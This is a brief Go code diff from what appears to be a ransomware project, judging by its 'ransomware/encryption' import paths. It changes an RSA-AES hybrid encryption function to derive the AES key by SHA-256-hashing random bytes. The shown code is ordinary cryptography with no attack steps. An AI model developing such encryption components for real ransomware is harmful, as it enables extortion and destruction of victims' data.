@@ -5,6 +5,7 @@ import (
 	"crypto/elliptic"
 	"crypto/rand"
 	"crypto/rsa"
+	"crypto/sha256"
 	"ransomware/encryption/aesLib"
 	"ransomware/encryption/eccLib"
 	"ransomware/encryption/rsaLib"
@@ -14,8 +15,12 @@ import (
 // with RSA and then returns the encrypted AES key concatenated with the encrypted message
 func RSAAESEncrypt(msg []byte, publicKey *rsa.PublicKey) ([]byte, error) {
 
-	aesKey := make([]byte, 32)
-	rand.Read(aesKey)
+	secret := make([]byte, 32)
+	rand.Read(secret)
+
+	hash := sha256.New()
+	hash.Write(secret)
+	aesKey := hash.Sum(nil)
 
 	encrypted, err := aesLib.EncryptAES(msg, aesKey)
 	if err != nil {
